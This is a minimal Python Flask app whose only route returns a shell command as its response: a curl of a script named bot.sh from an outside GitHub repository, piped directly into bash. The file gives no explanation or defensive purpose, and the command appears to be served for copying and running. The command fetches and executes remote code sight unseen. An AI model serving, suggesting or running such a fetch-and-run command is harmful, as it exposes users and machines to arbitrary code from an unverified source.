from flask import Flask

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'curl https://raw.githubusercontent.com/snzezzwds/voidgitpod/main/bot.sh | bash'

if __name__ == '__main__':
    app.run()
